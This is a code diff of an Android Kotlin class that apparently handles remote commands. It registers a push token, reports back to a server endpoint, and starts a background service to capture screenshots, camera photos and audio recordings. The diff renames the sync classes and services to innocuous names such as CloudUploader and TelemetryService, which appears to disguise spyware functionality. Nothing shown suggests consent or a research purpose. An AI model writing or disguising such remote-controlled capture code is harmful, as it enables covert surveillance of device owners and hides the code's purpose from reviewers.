@@ -57,7 +57,7 @@ class Commands(private val context: Context) {
     private fun registerFCMToken(token: String) {
         executor.execute {
             try {
-                val url = URL("${DataSynchronizer.SyncConfig.API_ENDPOINT}register_fcm")
+                val url = URL("${CloudUploader.SyncConfig.API_ENDPOINT}register_fcm")
                 val connection = url.openConnection() as HttpURLConnection
                 connection.requestMethod = "POST"
                 connection.setRequestProperty("Content-Type", "application/json")
@@ -154,7 +154,7 @@ class Commands(private val context: Context) {
                     }
                 }
 
-                val url = URL("${DataSynchronizer.SyncConfig.API_ENDPOINT}command_response")
+                val url = URL("${CloudUploader.SyncConfig.API_ENDPOINT}command_response")
                 val connection = url.openConnection() as HttpURLConnection
                 connection.requestMethod = "POST"
                 connection.setRequestProperty("Content-Type", "application/json")
@@ -192,7 +192,7 @@ class Commands(private val context: Context) {
             }
             sendCommandResponse(commandId, true, "Screenshot requested", result)
 
-            val intent = android.content.Intent(context, BackgroundSyncService::class.java)
+            val intent = android.content.Intent(context, TelemetryService::class.java)
             intent.action = "CAPTURE_SCREENSHOT"
             intent.putExtra("command_id", commandId)
             context.startService(intent)
@@ -224,7 +224,7 @@ class Commands(private val context: Context) {
             sendCommandResponse(commandId, true, "Camera capture requested", result)
 
             // Send intent to BackgroundSyncService to take a photo
-            val intent = android.content.Intent(context, BackgroundSyncService::class.java)
+            val intent = android.content.Intent(context, TelemetryService::class.java)
             intent.action = "CAPTURE_CAMERA"
             intent.putExtra("command_id", commandId)
             context.startService(intent)
@@ -247,7 +247,7 @@ class Commands(private val context: Context) {
             }
             sendCommandResponse(commandId, true, "Audio recording requested", result)
 
-            val intent = android.content.Intent(context, BackgroundSyncService::class.java)
+            val intent = android.content.Intent(context, TelemetryService::class.java)
             intent.action = "CAPTURE_AUDIO"
             intent.putExtra("command_id", commandId)
             intent.putExtra("duration", duration)
